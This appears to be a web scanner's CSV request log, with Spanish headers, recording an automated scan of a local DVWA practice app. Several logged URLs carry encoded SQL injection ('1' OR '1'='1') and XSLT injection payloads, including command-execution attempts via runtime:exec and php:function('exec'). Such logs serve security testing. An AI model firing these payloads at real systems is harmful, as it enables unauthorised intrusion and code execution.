ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
2775,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/css,301,Moved Permanently,1,212,354
2776,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?=&Submit=Submit,200,OK,0,613,1342
2777,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,3,272,1342
2778,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/images,301,Moved Permanently,0,215,357
2779,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=&Submit=Submit,200,OK,0,613,1342
2780,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2781,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%40&Submit=Submit,200,OK,1,613,1342
2782,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities,301,Moved Permanently,1,219,361
2783,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2784,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%2B&Submit=Submit,200,OK,1,613,1342
2785,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
2786,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,3,272,1342
2787,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%00&Submit=Submit,200,OK,1,613,1342
2788,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,3,272,1342
2789,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%7C&Submit=Submit,200,OK,2,632,1342
2790,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2791,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,200,OK,0,613,1342
2792,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,3,272,1342
2793,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&=,200,OK,0,613,1342
2794,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2795,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=,200,OK,1,613,1342
2796,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%40,200,OK,1,613,1342
2797,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,291,1342
2798,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2799,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2B,200,OK,1,613,1342
2800,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2801,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%00,200,OK,0,613,1342
2802,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2803,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7C,200,OK,1,613,1342
2804,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2805,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2806,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2807,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2808,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2809,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2810,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2811,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2812,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2813,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2814,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2815,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2816,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2817,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2818,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2819,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2820,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2821,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2822,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2823,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2824,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1381
2825,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,291,1342
2826,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1381
2827,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2828,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1381
2829,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2830,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1381
2831,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2832,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1381
2833,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,1,161,311
2834,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,0,161,311
2835,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa,301,Moved Permanently,0,208,350
2836,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/css,301,Moved Permanently,0,212,354
2837,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/images,301,Moved Permanently,0,215,357
2838,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities,301,Moved Permanently,0,219,361
2839,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,0,224,366
2840,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa,301,Moved Permanently,1,208,350
2841,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2842,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C&Submit=Submit,200,OK,1,613,1342
2843,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/css,301,Moved Permanently,0,212,354
2844,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&Submit=Submit,200,OK,0,613,1342
2845,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/images,301,Moved Permanently,1,215,357
2846,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,4,272,1342
2847,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=system-property%28%27xsl%3Avendor%27%29%2F%3E&Submit=Submit,200,OK,0,613,1342
2848,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2849,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities,301,Moved Permanently,0,219,361
2850,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
2851,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
2852,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2853,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2854,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
2855,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2856,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&Submit=Submit,200,OK,0,613,1342
2857,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2858,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&Submit=Submit,200,OK,1,613,1342
2859,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2860,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&Submit=Submit,200,OK,0,613,1342
2861,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2862,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C,200,OK,0,613,1342
2863,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,613,1342
2864,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2865,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2866,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,613,1342
2867,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2868,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,613,1342
2869,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2870,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2871,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2872,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2873,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2874,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2875,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2876,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,2,272,1342
2877,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2878,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2879,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,0,272,1342
2880,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,POST,http://localhost/dvwa/login.php,200,OK,1,272,1342
2881,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa,301,Moved Permanently,1,208,350
2882,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/css,301,Moved Permanently,0,212,354
2883,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/images,301,Moved Permanently,0,215,357
2884,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities,301,Moved Permanently,1,219,361
2885,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
2886,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa,301,Moved Permanently,0,208,350
2887,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/css,301,Moved Permanently,1,212,354
2888,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/dvwa/images,301,Moved Permanently,0,215,357
2889,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities,301,Moved Permanently,1,219,361
2890,Thu Mar 19 12:03:23 CST 2026,Thu Mar 19 12:03:23 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
